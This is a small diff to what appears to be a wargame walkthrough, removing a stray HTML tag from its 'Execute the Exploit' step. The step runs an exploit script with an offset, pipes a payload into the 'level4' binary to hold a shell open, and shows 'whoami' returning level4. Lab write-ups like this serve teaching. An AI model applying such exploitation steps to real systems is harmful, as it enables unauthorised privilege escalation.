@@ -85,7 +85,7 @@ print("Wrote payload with offset %d" % offset)
 ```
 ### Step 4: Execute the Exploit
 ```
-python exploit.py 11 </br>
+python exploit.py 11
 (cat payload.txt; cat) | ./level4
 $ whoami
 level4
